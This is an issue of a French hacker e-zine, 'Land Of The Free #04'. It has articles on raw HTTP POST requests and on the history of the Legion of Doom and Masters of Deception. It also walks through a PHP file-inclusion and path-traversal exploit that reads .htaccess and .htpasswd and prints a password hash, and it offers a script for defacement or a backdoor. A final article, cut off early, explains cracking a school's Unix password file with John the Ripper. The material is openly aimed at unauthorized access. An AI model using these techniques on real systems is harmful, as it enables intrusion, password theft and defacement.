<html>
<head>
<title>LOTFREE#04 By Sirius BLACK</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="stylesheet" href="lotfree.css" type="text/css">
</head>

<body bgcolor="#FFFFFF" text="#000000">
<table width="751" border="0" class="normalText">
  <tr bgcolor="#262695"> 
    <td height="85" valign="top" width="745" class="heading2"> 
      <div align="center"> 
        <p><u><font size="5" color="#FFFF00"><b><font color="#FFFFFF">Land Of 
          The Free #04</font></b></font></u></p>
        <p><font color="#FFFFFF"><i>par Sirius Black</i></font></p>
      </div>
    </td>
  </tr>
  <tr> 
    <td height="69" valign="top" class="heading"> 
      <ol>
        <li><a href="#intro"><font size="2">Introduction</font></a></li>
        <li><a href="#post"><font size="2">La m&eacute;thode POST (suite de l'article 
          sur le HTTP)</font></a></li>
        <li><a href="#MODvsLOD"><font size="2">Les Masters Of Deception &amp; 
          Les Legion of Doom</font></a></li>
        <li><a href="#htaccess"><font size="2">Du PHP !! (faille expliqu&eacute;e... 
          faille exploit&eacute;e)</font></a></li>
        <li><font size="2"><a href="#john">Avoir les pass de ton bahut non crypt&eacute;</a></font></li>
        <li><a href="#fuckISP"><font size="2">Petit vol d'une connexion web</font></a></li>
        <li><a href="#nasm">Fait bouger ton DOS avec l'assembleur</a></li>
        <li><a href="#spoof">Spoofing isn't proxying</a></li>
        <li><a href="#keygen1">Tutorial de Cracking (keygen 1)</a></li>
        <li><a href="#keygen2">Tutorial de cracking (keygen2)</a></li>
        <li><a href="#john16">Les pass Unix, la suite avec l'utilisation de John 
          1.6</a></li>
        <li><a href="#sqlinjection">SQL injection sur une base MySQL</a></li>
        <li><a href="#conclusion">Conclusion</a></li>
      </ol>
    </td>
  </tr>
  <tr> 
    <td height="21" valign="top" class="subheading"> 
      <p align="left"><u><a name="intro"></a><b><font color="#000000" size="2">Introduction</font></b></u></p>
    </td>
  </tr>
  <tr> 
    <td height="341" valign="top" class="normalText"> 
      <p align="left"><font size="2">Voici l'&eacute;dition num&eacute;ro 4 de 
        Lotfree !!! Comme d'habitude le sommaire se fera au fur et &agrave; mesure 
        que j'&eacute;cris. Cel&agrave; dit je vous ai promis quelques trucs notemment 
        <font color="#FF0000"> la m&eacute;thode POST, de l'assembleur... </font>Chose 
        promie, chose due !! Aussi un article sur le <font color="#FF0000">crack 
        de pass Unix</font>... J'attends toujours vos articles donc n'h&eacute;sitez 
        pas :<a href="mailto:sirius.black@lycos.fr"> sirius.black@lycos.fr</a> 
        (pour une fois que j'ai une adresse qui marche ;-). J'ai du formater mon 
        disque et j'ai perdu pas mal de docs int&eacute;ressantes mais j'avais 
        une sauvegarde sur un RW. La connerie c'est qu'elle est pas super r&eacute;cente 
        (j'ai pas la version compl&egrave;te de lotfree03 c'est pour vous dire 
        !). Toujours pas de disclaimer (pour quoi faire ? J'ai pas la DST au cul 
        et puis je vois mal un hacker &agrave; un proc&egrave;s dire &quot;j'ai 
        seulement fait ce qu'il y a &eacute;crit dans lotfree, c'est de la faute 
        de Sirius Black, il a pas mis de disclaimer, c'est lui qui faut arr&ecirc;ter&quot;). 
        En revanche voici un avertissement largement inspir&eacute; du livret 
        d'un album de NOFX :</font></p>
      <p align="left"><font size="2">Avertissement : Ce zine peut provoquer des 
        effets secondaires incluant : naus&eacute;es, difficult&eacute;s &agrave; 
        articuler ses phrases, renvoi de bile, maux de t&ecirc;tes, diarrh&eacute;e, 
        stigmates, mauvaise haleine, pubert&eacute;, syndrome de choc septique, 
        fascisme, folie, d&eacute;c&egrave;s d'Henry Rollins (qui provoque des 
        pulsions soudaines &agrave; porter des sous-v&eacute;tements tout en chantant 
        des po&egrave;mes &agrave; de jeunes gar&ccedil;ons), confusion, mains 
        mo&icirc;tes, pertes de seins, parresse, et dans certains cas, mort douce. 
        Des r&eacute;actions allergiques ainsi que des explosions ont &eacute;t&eacute; 
        rapport&eacute;es, et dans certaines rares circonstances, ecchymoses du 
        syst&egrave;me nerveux central et blessures d'ego. Les personnes Juives 
        pourraient ressentir de la cupabilit&eacute;, alors que les catholiques 
        pourraient ressentir de la discipline. Les effets secondaires sexuels 
        incluent : homosexualit&eacute;, &eacute;jaculation pr&eacute;matur&eacute;e, 
        cunnilingus, et plus d'homosexualit&eacute; en weekends. Si vous souffrez 
        de l'un de ces symptomes, s'il vous pla&icirc;t, prenez deux Vicodin avec 
        un marteau &agrave; digestif et consultez votre infirmi&egrave;re praticienne 
        Laura du petit matin jusqu'&agrave; tard le soir en prenant le bus num&eacute;ro 
        un.<br>
        Sur ce je crois que vous &ecirc;tes pr&eacute;venus !!</font></p>
    </td>
  </tr>
  <tr> 
    <td valign="top" height="11" class="subheading"> 
      <p align="left"><u><a name="post"></a><font color="#000000"><b><font size="2">La 
        m&eacute;thode POST</font></b></font></u></p>
    </td>
  </tr>
  <tr> 
    <td valign="top" height="467" class="normalText"> 
      <p align="left"><font size="2">La m&eacute;thode POST offre un peu plus 
        de s&eacute;curit&eacute; que la GET car elle n'apparait pas en clair 
        dans la barre de navigation. Toutefois, le nom des variables reste toujours 
        visible si on affiche la source de la page web. Afin de stopper bon nombre 
        de lamers, un webmaster pourra cr&eacute;er un script qui n'acceptera 
        les variables que si elles sont pass&eacute;es en POST. En un mot la m&eacute;thode 
        POST c'est la discr&eacute;tion. Si on tombe dans une situation d'un script 
        prot&eacute;g&eacute;, il s'uffira de le bluffer de la m&ecirc;me fa&ccedil;on 
        que l'on a vu dans le mag pr&eacute;c&eacute;dent.<br>
        Avant que vous vous posiez la question, oui j'ai install&eacute; le package 
        Easy PHP chez moi. Ca regroupe un interpreteur PHP, un serveur Apache 
        ainsi qu'une base MySQL.<br>
        Voici un exemple de script prot&eacute;g&eacute; qui affiche (dans le 
        cas d'un POST) la variable et sa valeur sous la forme POST[$variable]=$valeur.</font></p>
      <p align="left"><font size="2"><span class="script">&lt;?php<br>
        if ($REQUEST_METHOD=='POST'){</span> <font color="#FF0000">//v&eacute;rifie 
        que la m&eacute;thode est POST</font><br>
        <span class="script">&nbsp;&nbsp;&nbsp;&nbsp;$var=$HTTP_POST_VARS;</span> 
        <font color="#FF0000">// si c'est le cas on r&eacute;cup&egrave;re les 
        donn&eacute;es</font><br>
        <span class="script">&nbsp;&nbsp;&nbsp;&nbsp;while (list($indice,$valeur)=each($var)) 
        echo &quot;$REQUEST_METHOD&quot;.&quot;[$indice]&quot;.&quot; : $valeur&lt;br&gt;&quot;;</span> 
        <font color="#FF0000">//et on les affiche</font><br>
        <span class="script">}<br>
        else echo &quot;D&eacute;sol&eacute; script prot&eacute;g&eacute;&quot;;</span> 
        <font color="#FF0000">//sinon Bad Boy !!!</font><br>
        <span class="script">?&gt;</span></font></p>
      <p align="left"><font size="2">Il faut savoir que la variable $HTTP_POST_VARS 
        est un tableau qui regroupe les donn&eacute;es envoy&eacute;es en POST. 
        Il existe une variable similaire pour GET (je vous laisse deviner comment 
        elle s'appelle :-). En PHP un tableau n'est pas forc&eacute;ment indic&eacute; 
        par des nombres. Par exemple si on envoie la variable var1 avec pour valeur 
        &quot;hack&quot;. Alors on peut r&eacute;cup&eacute;rer la variable de 
        cette fa&ccedil;on : echo &quot;$HTTP_POST_VARS['var1']&quot;; affichera 
        &quot;hack&quot;. En effet ici l'indice est var1 comme quoi le PHP est 
        super puissant. Ce langage est d'ailleurs un hybride du bash (langage 
        style batch mais sous UNIX) avec le langage C.<br>
        La fonction list n'est pas n&eacute;cessaire &agrave; comprendre : elle 
        r&eacute;cup&egrave;re tour &agrave; tour le couple (variable,valeur).</font></p>
      <p align="left"><font size="2">La m&eacute;thode POST requiert deux lignes 
        d'en-t&ecirc;te suppl&eacute;mentaire : content-length et content-type. 
        Content-Type donne le type de donn&eacute;es et Content-Length la longueur 
        totale de donn&eacute;es en octets (en caract&egrave;res car un caract&egrave;re=un 
        octet ;-).<br>
        Dans notre cas la ligne sp&eacute;cifiant le type sera toujours : <font color="#FFFF00" class="script">Content-Type:application/x-www-form-urlencoded</font><br>
        C'est ainsi que les navigateurs envoient les donn&eacute;es par un formulaire. 
        Voici un exemple de POST :</font></p>
      <p align="left"><font size="2"><span class="script">POST /projet1/method.php 
        HTTP/1.1<br>
        host:127.0.0.1<font color="#FF0000"></font></span><font color="#FF0000"> 
        // ne l'oubliez pas !!!</font><br>
        <span class="script">Content-Length:18</span><font color="#FF0000"> // 
        18 caract&egrave;res</font><br>
        <span class="script">Content-Type:application/x-www-form-urlencoded</span> 
        <font color="#FF0000">// format formulaire </font><br>
        <font color="#FF0000"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// 
        Il faut laisser une ligne pour d&eacute;limiter donn&eacute;es et en-t&ecirc;tes</font><br>
        <span class="script">var1=arc&amp;var2=hack</span> <font color="#FF0000">// 
        les donn&eacute;es format&eacute;es selon le stype http : variable1=valeur1&amp;variable2=valeur2 
        etc.</font></font></p>
      <p align="left"><font size="2"><span class="script">HTTP/1.1 200 OK<br>
        Date: Wed, 11 Sep 2002 18:45:07 GMT<br>
        Server: Apache/1.3.20 (Win32) PHP/4.0.6<br>
        X-Powered-By: PHP/4.0.6<br>
        Transfer-Encoding: chunked<br>
        Content-Ty<font face="Arial, Helvetica, sans-serif">pe: te</font>xt/html<br>
        <br>
        14<br>
        POST[var1] : arc&lt;br&gt;</span><font color="#FF0000"> // r&eacute;ussi 
        !!!</font><br>
        <span class="script">POST[var2] : hack&lt;br&gt;<br>
        0</span><br>
        <br>
        Les deux lignes d'en-t&ecirc;tes sont tr&egrave;s importantes. Calculez 
        bien la longeur de la chaine de donn&eacute;es avant de vous lancer car 
        le serveur lit vos caract&egrave;res un par un et il ferme d&egrave;s 
        qu'il a le nombre de caract&egrave;res qu'on lui a dit. Si on ne mets 
        pas assez de caract&egrave;res il va attendre qu'on en rajoute et l&agrave; 
        aussi c'est la merde. Donc prenez votre temps !! L'ordre de Type/Length 
        n'a pas d'importance, g essay&eacute; les 2 cas et &ccedil;a marche.</font></p>
    </td>
  </tr>
  <tr> 
    <td valign="top" height="12" class="subheading"> 
      <p align="left"><u><font color="#FFFF00"><a name="MODvsLOD"></a><font color="#000000"><b><font size="2">La 
        Story Masters Of Deceptions - Legion of Doom</font></b></font></font></u></p>
    </td>
  </tr>
  <tr> 
    <td valign="top" height="709" class="normalText"> 
      <p align="left"><font size="2">Bon, on continue avec les dossiers des hackers 
        c&eacute;l&eacute;bres. Aujourd'hui les <font color="#FF0000">Legion of 
        Doom</font> (LoD) et les<font color="#FF0000"> Masters of Deception</font> 
        (MoD).<br>
        Je pense que tout le monde connait le film, ou la s&eacute;rie, o&ugrave; 
        le dessin anim&eacute;, ou le comics book Superman. Vous savez le gus 
        qui porte des collants bleu et qui met son slip par dessus son <img src="mark_abene.jpg" width="200" height="209" align="right" alt="Phiber Optik-membre du LoD puis du MoD">pantalon... 
        Oui je sais c d&eacute;solant ;-)<br>
        Et bien ya un autre gus qui aime vraiment pas Superman et ce mec c Lex 
        Luthor. Dans un &eacute;pisode, l'affreux Luthor monte une team qui s'appelle 
        les &quot;Legion of Doom&quot; (les hordes de l'enfer) dans le but de 
        tuer Superman et de devenir ma&icirc;tre du monde (classique quoi).</font></p>
      <p align="left"><font size="2">En 1984, alors que le hacking peut se r&eacute;sumer 
        au phreaking (vu le nombre d'ordinateur personnel -&gt; Arf !!!). Un pirate 
        se fait appeller <font color="#FF0000">Lex Luthor</font>, ce mec est une 
        l&eacute;gende dans l'Underground, mais il est aussi tr&egrave;s myst&eacute;rieux, 
        pas le genre de mecs &agrave; se faire chopper, il ne laisse aucune trace 
        derri&egrave;re lui, personne ne sait rien de lui &agrave; part qu'il 
        est tr&egrave;s comp&eacute;tent.</font></p>
      <p align="left"><font size="2">A l'&eacute;poque tout les pirates se retrouvent 
        sur des BBS (Bulletin Board System), ce sont des forums auxquel on se 
        connecte avec un pc &eacute;quip&eacute; d'un modem et d'un num&eacute;ro 
        de t&eacute;l&eacute;phone parce que y'avait pas beaucoup de r&eacute;seaux 
        &agrave; l'&eacute;poque :-(<br>
        <br>
        <font color="#FF0000">Lex Luthor</font> est alors Co-SysOp de <font color="#FF0000">Plovernet</font> 
        (un BBS), c'est &agrave; dire co-system-operator. Comme il a acc&egrave;s 
        &agrave; pas mal d'infos sur d'autres hackers (num&eacute;ro de t&eacute;l&eacute;phone 
        surtout) il contacte tout les hackers qu'il trouve comp&eacute;tent afin 
        de former sa team : les Legion of Doom.<br>
        Ils se retrouvent sur des room priv&eacute;es (des channels en gros) et 
        ils partagent leur savoir.</font></p>
      <p align="left"><font size="2">Petit &agrave; petit le groupe s'agrandit 
        et se divise en deux : Legion of Doom et Legion of Hackers, ce dernier 
        sp&eacute;cialis&eacute; en informatique.<br>
        Les LoD &eacute;criront un tas d'articles s&eacute;par&eacute;ment notemment 
        pour Phrack mais ils ont aussi &eacute;crit le <font color="#FF0000">LOD 
        Technical Journal</font> (&agrave; prendre sur www.phreak.org avec un 
        tas d'autres mag).</font></p>
      <p align="left"><font size="2">Certains membres du LoD sont tellement c&eacute;l&egrave;bres 
        qu'un d&eacute;facage sign&eacute; de leur pseudo pourrait tuer un admin 
        d'une crise cardiaque (bon j'exag&egrave;re un peut, il vendrait son serveur 
        aux ench&egrave;res avec la page d&eacute;fac&eacute;e :-)</font></p>
      <p align="left"><font size="2">Il y a entre autres <font color="#FF0000">Lex 
        Luthor (le big boss), Dr Who, The Videosmith, Bill from RNOC, Phantom 
        Phreaker, Thomas Convenant, Phiber Optik (plus tard avec les MoD, voir 
        photos), Control C et... The Mentor.</font><br>
        The Mentor est consid&eacute;r&eacute; comme le plus grand &eacute;crivain 
        dans le monde underground. C'est lui l'auteur du Manifesto et d'autres 
        textes. Mais le manifesto est sans doute le texte le plus c&eacute;l&egrave;bre 
        chez les hackers.</font></p>
      <p align="left"><font size="2">Il y a eu un bust des Legion of Doom (comme 
        &agrave; peut pr&egrave;s pour tout les grands groupes). Le bust (arrestation) 
        &agrave; eu lieu suite au <font color="#FF0000">crach du service 911</font> 
        (crash du service d'urgence t&eacute;l&eacute;phonique aux states). Ce 
        crash a &eacute;t&eacute; un bordel pas possible dans l'underground et 
        les services secrets, il n'y a rien eu de tel depuis.<br>
        La l&eacute;gende veut que The Mentor se soit r&eacute;veill&eacute; avec 
        un flingue dans la bouche. Info ou intox ? En tout cas il a subit quelques 
        violences de la part des agents (&ccedil;a c'est s&ucirc;r).</font></p>
      <p align="left"><font size="2">Pour savoir tout des Legion of Doom, voici 
        leur histoire &eacute;crite par eux : <a href="p31-05">phrack #31 article 
        5</a></font></p>
      <p align="left"><font size="2">Pour tout savoir des Masters of Deceptions 
        --&gt; <a href="mod.txt">L'article de Wired </a>(ouvrez le plut&ocirc;t 
        avec le bloc note : mod.txt), un mag en Anglais sur l'informatique de 
        tr&egrave;s grande renomm&eacute;e. </font></p>
      <p align="left"><font size="2">Moi je ne fais que rajouter quelques d&eacute;tails 
        croustillants. L'histoire du MoD (dont le nom veut dire tout ce qu'on 
        veut, c'est juste pour se moquer du LoD) fini lorsque<font color="#FF0000"> 
        Eric Bloodaxe</font> (de son vrai nom Chris Coggan, membre du LoD) porte 
        pleinte pour piratage t&eacute;l&eacute;phonique contre le MoD (les LoD 
        avaient arr&eacute;t&eacute; les activit&eacute;es ill&eacute;gales).</font></p>
      <p align="left"><font size="2">Ce comportement a beaucoup g&eacute;n&eacute; 
        dans l'underground et je trouve moi m&ecirc;me que Eric Bloodaxe n'a pas 
        r&eacute;ugi comme il aurait du. Ca a caus&eacute; pas mal de d&eacute;bat 
        notemmant lors d'une conf&eacute;rence (une summercon je crois). Emmanuel 
        Goldstein, autheur du 2600 et porte parole des hackers, en a beaucoup 
        discut&eacute; avec Bloodaxe (je n'y &eacute;tais pas mais j'ai lu pas 
        mal de truc dessus).<br>
        Emmanuel Goldstein a d'ailleurs pass&eacute; la dernier journ&eacute;e 
        de libert&eacute; de Phiber Optik avec lui : <a href="p45-09">article</a></font></p>
      <p align="left"><font size="2">L'histoire racont&eacute;e par Wired est 
        vraiment bien &eacute;crite, celle du LoD est un peu plus formelle :-(.<br>
        On termine avec une photo du MoD :</font></p>
      <p align="center"><font size="2"><br>
        <img src="MOD.GIF" width="400" height="400" align="middle"> </font></p>
    </td>
  </tr>
  <tr> 
    <td valign="top" height="9" class="subheading"> 
      <p align="left"><u><font color="#FFFF00"><a name="htaccess"></a><font color="#000000" size="2"><b>Petit 
        cours de PHP (exploitation d'une faille)</b></font></font></u></p>
    </td>
  </tr>
  <tr> 
    <td valign="top" height="787" class="normalText"> 
      <p align="left"><font size="2">Putain mais qu'est ce qui m'a pris de foutre 
        cette rubrique, &ccedil;a me fait chier de la faire mais bon... De quoi 
        je vais vous parler ? A &ccedil;a y est je vois.<br>
        Bon je vais vous parler des <font color="#FF0000">protections .htaccess</font> 
        et de comment les contourner sur un site php mal s&eacute;curis&eacute;.<br>
        La preuve que &ccedil;a marche c'est que je me suis hack&eacute; mon script 
        (lol !!).<br>
        En fait le serveur Apache (et peut &ecirc;tre d'autres) permet une <font color="#FF0000">protection 
        web par authentification</font>. C'est &agrave; dire que pour acc&egrave;der 
        &agrave; une ressource donn&eacute;e vous devez entrer login et password.</font></p>
      <p align="left"><font size="2">Le principe est le suivant : on bloque l'acc&egrave;s 
        &agrave; un r&eacute;pertoire gr&acirc;ce &agrave; un fichier qui se trouve 
        dans ce r&eacute;pertoire. Quand on demande une page qui se trouve dans 
        ce rep, le serveur cherche un fichier qui est par d&eacute;faut le fichier 
        .htaccess dans lequel est inscrit les r&eacute;gles d'authentification.<br>
        Pourquoi ce fichier s'apelle '.htaccess' ? Surrement que ht signifie hypertext, 
        access acc&egrave;s et commence par un point car les fichiers cach&egrave;s 
        sous unix commence comme &ccedil;a.</font></p>
      <p align="left"><font size="2">Prenons mon cas : g un r&eacute;pertoire 
        admin &agrave; la racine de mon site et je veux que personne n'y ai acc&egrave;s 
        sauf moi. Alors je cr&eacute;e un fichier .htaccess. Pour cela Apache 
        propose 2 logiciels : htdigest et htpasswd. Avec htdigest je cr&eacute;e 
        le .htaccess que je met dans mon rep admin, dedans ce fichier il y a :</font></p>
      <p align="left"><font size="2" color="#FFFF00" class="script">AuthName &quot;CyberPunk&quot;<br>
        AuthType Basic<br>
        AuthUserFile &quot;C:\Program Files\EasyPHP\home\niico\.htpasswd&quot;<br>
        Require valid-user</font></p>
      <p align="left"><font size="2">AuthName est le nom du domaine, c'est ce 
        qui est entre autre affich&eacute; lorsque l'on demande une page de ce 
        r&eacute;pertoire (&ccedil;a provoque l'ouverture d'une fen&ecirc;tre 
        qui demande login et password).<br>
        AuthType est le niveau de s&eacute;curit&eacute;, il y en a deux, l&agrave; 
        le moins s&eacute;curis&eacute; mais c'est juste au niveau du cryptage.<br>
        AuthUserFile est le ligne qui nous int&eacute;resse, elle contient le 
        chemin, soit relatif soit absolu du fichier contenant le mot de passe.<br>
        Require est la classe d'authentification : on peut acc&egrave;pter simplement 
        sur le login, sur login/pass, accepter tout le monde...</font></p>
      <p align="left"><font size="2">Avant de continuer je pr&eacute;f&eacute;re 
        vous donner l'organisation de mes r&eacute;pertoires :<br>
        EasyPHP est install&eacute; dans c:\Program Files\EasyPHP\<br>
        Les pages web sont toujours dans le dossier www situ&eacute; dans EasyPHP\<br>
        Dans ce m&ecirc;me r&eacute;pertoire (EasyPHP) j'ai un dossier home avec 
        dedans un dossier niico et dans ce dossier le fichier .htpasswd<br>
        Vous voyez &agrave; peu pr&egrave;s ? N'h&eacute;sitez pas &agrave; faire 
        un sch&eacute;ma &ccedil;a peut vous aider ;-)</font></p>
      <p align="left"><font size="2">Petite parenth&egrave;se : les fichiers .htaccess 
        et .htpasswd sont ceux cr&eacute;es par d&eacute;faut mais rien ne vous 
        emp&ecirc;che de changer leurs noms dans les config de Apache.</font></p>
      <p align="left"><font size="2">J'ai aussi dans www deux dossiers principaux 
        : projet1 (partie publique) et admin (partie priv&eacute;e).<br>
        La partie public contient un script vraiment pas s&eacute;curis&eacute; 
        nomm&eacute; file.php qui inclus le fichier que l'on lui passe comme param&egrave;tre.</font></p>
      <p align="left"><font size="2">Imaginons que j'arrive sur un site, je vois 
        des images qui sont pris dans un r&eacute;pertoire admin. Int&eacute;ressant 
        non ? Dans mon navigateur je met donc www.lesite.com/admin/ histoire de 
        voir ce qu'il y a dedans. Et l&agrave; BOUM il me demande un login et 
        un password.</font></p>
      <p align="left"><font size="2">Pas de panique, je cherche un script &agrave; 
        la con qui m'ouvrira toutes les portes, je trouve file.php dont voici 
        le source :</font></p>
      <p align="left"><font size="2" color="#FFFF00"><span class="script">&lt;?php<br>
        echo &quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Page d'inclusion&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&quot;;<br>
        if (isset($file)) include(&quot;$file&quot;);<br>
        else echo &quot;pas de fichiers inclus&lt;br&gt;&quot;;<br>
        echo &quot;&lt;br&gt;bye&lt;/body&gt;&lt;/html&gt;&quot;;</span></font><span class="script"><font color="#FFFF00"><br>
        <font size="2" class="script">?&gt;</font></font></span></p>
      <p align="left"><font size="2">Ce script regarde si on lui passe un argument 
        nomm&eacute; file comme param&egrave;tre, si ya pas il affiche &quot;pas 
        de fichiers inclus bye&quot; et si yen a un il inclus le fichier et met 
        bye apr&egrave;s.<br>
        L'inclusion est une m&eacute;thode sp&eacute;ciale de php, ce n'est pas 
        une simple lecture car elle permet d'ex&eacute;cuter un autre script. 
        Cette commande intercale les lignes d'un script donn&eacute;, dans le 
        script courant. Mais la faille que je vous montre peut aussi bien marcher 
        avec un script de simple lecture.</font></p>
      <p align="left"><font size="2">Je profite donc de ce script pour passer 
        &agrave; travers la protection htaccess, je tape dans mon navigateur : 
        http://127.0.0.1/projet1/FILE.PHP?file=..\admin\.htaccess et j'obtiens 
        :<br>
        <font color="#FFFF00"><span class="script">AuthName &quot;CyberPunk&quot; 
        AuthType Basic AuthUserFile &quot;C:\Program Files\EasyPHP\home\niico\.htpasswd&quot; 
        Require valid-user</span></font><span class="script"><br>
        bye</span></font></p>
      <p align="left"><font size="2">Conclusion : le fichier contenant le mot 
        de passe est c:\Pro...\niico\.htpasswd. Bon moi je connais mon PC donc 
        je savais comment acc&egrave;der au chemin &agrave; travers les r&eacute;pertoires. 
        Mais en connaissant la fa&ccedil;on dont marche EasyPHP, n'importe qui 
        peut comprendre.<br>
        <font color="#FF0000">La racine du site est www\</font>, au dessus c'est 
        EasyPHP, nous on est dans /projet1/file.php donc il faut que l'on sorte 
        de la racine web : on remonte deux fois, une pour projet1, l'autre pour 
        www. On commence donc par ..\..\ On est alors dans EasyPHP, on rajoute 
        home\niico\.htpasswd, ce qui donne chez moi :</font><br>
      </p>
      <p align="left"><font size="2">http://127.0.0.1/projet1/FILE.PHP?file=..\..\home\niico\.htpasswd<br>
        J'obtiens :<br>
        </font><font size="2" color="#FFFF00"><span class="script">CyberPunk:$apr1$CM......$aUEdAaYOBvUh38gK1cD9t1</span></font><span class="script"><font size="2"><br>
        bye</font></span></p>
      <p align="left"><font size="2">CyberPunk c'est le login et le reste est 
        le <font color="#FF0000">pass encrypt&eacute; en MD5</font>. Ne croyez 
        pas les conneries que l'on peut lire dans certains mag, le pass est toujours 
        crypt&eacute;.<br>
        La deuxi&egrave;me faille est en fait que quand vous remplissez la fen&ecirc;tre 
        de login/password, <font color="#FF0000">les informations sont envoy&eacute;es 
        cod&eacute;es en base 64</font> au serveur web.<br>
        Le danger vient donc si vous &ecirc;tes sur un r&eacute;seau local, et 
        que vous souhaitez administrer votre site &agrave; distance, un mec sur 
        le r&eacute;seau peut sniffer vos donn&eacute;es et les d&eacute;crypter, 
        c'est tout.<br>
        Quand au MD5, il doit exister un truc pour le casser mais g pas trouv&eacute;, 
        alors si vous connaissez un logiciel, &eacute;crivez moi.</font></p>
      <p align="left"><font size="2">Qu'est ce qu'y peut y avoir dans le dossier 
        admin une fois que l'on y a acc&egrave;s ? Et bien un script permettant 
        de cr&eacute;er des pages par exemple, pratique pour un d&eacute;facage, 
        ou pour mettre une backdoor ;-) Je vous donne en cadeau, un petit script 
        nomm&eacute; admin.php.txt qui permet &ccedil;a.</font></p>
    </td>
  </tr>
  <tr> 
    <td valign="top" height="9" class="subheading"><b><u><a name="john"></a>Avoir 
      les pass de ton bahut non crypt&eacute; (avec john v1.0)</u></b></td>
  </tr>
  <tr> 
    <td valign="top" height="3798" class="normalText"> 
      <p>Ca y est, l'article que vous attendiez tous est arriv&eacute; (sans se 
        presser :-) On va voir diff&eacute;rentes m&eacute;thodes pour obtenir 
        les pass et &agrave; mon avis vous allez pas &ecirc;tre d&eacute;cu.<br>
        Bon on va commencer par des rappels sur les <b>fichiers passwords sous 
        Unix</b> (si c'est la premi&egrave;re fois que vous les voyez, il est 
        jamais trop tard). Il va de soit que les logins/password des utilisateurs 
        sont enregistr&eacute;s quelques part. Unix s'appuie sur un syst&egrave;me 
        de fichier pr&eacute;d&eacute;fini, ce syst&egrave;me est pr&eacute;sent 
        sur tout les *NIX et permet de faire fonctionner l'OS (un peu comme le 
        c:\windows). Les fichiers syst&egrave;mes sont donc &agrave; des endroits 
        pr&eacute;cis qui sont toujours les m&ecirc;mes. Entre parenth&egrave;ses, 
        comme tout syst&egrave;me &eacute;volu&eacute;, Unix est multiutilisateur. 
        Ca veut dire deux choses :<br>
        1- Que Windows 3.1, win95, win98 et winMe ne sont pas &eacute;volu&eacute;s<br>
        2- Que si ya plusieurs utilisateurs alors il y a des droits, des logins 
        et des pass diff&eacute;rents<br>
        Bon j'avoue c'&eacute;tait surtout pour casser Windows ;-) (et tu casses 
        !!! Double !!!)<br>
        Quoi qu'il en soit le fichier password est dans <b>/etc/passwd</b>, une 
        ligne de ce fichier password peut ressembler &agrave; &ccedil;a :<br>
        <span class="script">dupuy:K0wEFtIa/zcx6:2618:1000:Paul Dupuy:/home/dupuy:/bin/bash</span><br>
        Dans ce cas, le password est non &quot;<b>shadow</b>&quot;, c'est &agrave; 
        dire que l'on voit sa traduction crypt&eacute;. Tout est s&eacute;par&eacute; 
        par les deux points.<br>
        Le premier champ est le login, le second le password crypt&eacute;, le 
        troisi&egrave;me les droits de l'utilisateur, le quatri&egrave;me les 
        droits du groupe auquel il fait parti puis une description du compte (en 
        r&egrave;gle g&eacute;n&eacute;rale les noms et pr&eacute;noms). En sixi&egrave;me 
        position on retrouve la racine de son compte (en g&eacute;n&eacute;ral 
        /home/&lt;login&gt;/) suivit du shell qui est ex&eacute;cut&eacute; quand 
        l'utilisateur se logge sur le syst&egrave;me.<br>
        Pour afficher le fichier passwd, rien de plus simple, vous faites un cat 
        /etc/passwd. Pour le r&eacute;cup dans un fichier vous rajoutez &quot;&gt;NomDuFichier&quot; 
        mais je pense que vous le savez.<br>
        Une fois que vous avez ce fichier, vous le cracker avec un Unix Password 
        Cracker, le mieux est sans doute <i>john</i> &agrave; la fois pour son 
        efficacit&eacute; et aussi vous ses fonctionnalit&eacute;es. Mais il y 
        un a un tas d'autres comme <i>CrackerJack </i>(que j'ai jamais r&eacute;ussi 
        &agrave; faire marcher), <i>Crack</i> (un des premiers),<i> PaceCrack95</i> 
        (sur win95), <i>QCrack</i> (sur Linux), <i>PCrack</i> (en perl), <i>Hades</i> 
        (comme le gardien de l'enfer), <i>Star Cracker, Killer Cracker, HellfireCracker, 
        XIT, Claymore, Guess, PC Unix Cracker</i> (s'est pas foul&eacute; pour 
        le nom) et <i>Merlin</i>. Alors vous &ecirc;tes clou&eacute; l&agrave; 
        ? Ben non ya pas que <i>Jack</i> et <i>John</i> !<br>
        Les passwords sont encrypt&eacute;s au format <b>DES</b>, sa faiblesse 
        est que c'est une m&eacute;thode qui commence &agrave; dater (1977 pour 
        les premi&egrave;res versions). Unix utilise une fonction appel&eacute;e 
        <b>crypt()</b> pour encoder votre password.<br>
        Lorsque vous vous connecter, Unix prend votre password, le crypte, et 
        le compare &agrave; la version crypt&eacute; dans le fichier passwd, si 
        c'est bon vous entrez sinon Bad Boy ;-)<br>
        Un cracker marche de la m&ecirc;me mani&egrave;re, il prend un mot de 
        passe plus ou moins au hazard, le crypte et le compare.<br>
        Perso je n'utilise que John The Ripper pour les raisons que j'ai dit plus 
        haut, mais aussi parce qu'il est cod&eacute; par un m&eacute;ga hacker 
        : <b>Solar Designer</b> qui a &eacute;crit un tas de trucs pour Phrack 
        et qui continue &agrave; faire des progs et m&ecirc;me des versions de 
        John.</p>
      <p><u>Premi&egrave;re &eacute;tape : utilisation de John</u>, apr&egrave;s 
        on passera aux autres cas.<br>
        John est tr&egrave;s puissant, une de ses fonctions est de deviner le 
        password en fonction du nom/prenom/login de la victime. Par exemple si 
        le login est toto il va essayer toto1... toto4648, toto*254, toot54, otto-28 
        et un tas de calcul diff&eacute;rents. L'avantage ? Quand un mec a fait 
        son pass en fonction de son login, il est vite crack&eacute;. Un exemple 
        ? J'ai crack&eacute; un pass en moins de 5 secondes montre en mains : 
        le login &eacute;tait mathieu et le pass... ueihtam8, vous voyez le truc 
        ? Login retourn&eacute; puis 8 ajout&eacute; pour obtenir un pass de 8 
        caract&egrave;res. Car les pass doivent faire moins de 9 caract&egrave;res.<br>
        Cette m&eacute;thode est l'option<b> -single</b>. Dans mes exemples &lt;passwd&gt; 
        repr&eacute;sente le fichier password r&eacute;cup&eacute;rer. Pour cracker 
        par single on fait :<br>
        <span class="script">john -single &lt;passwd&gt;</span> (john se lance 
        dans une fen&ecirc;tre ms-dos)</p>
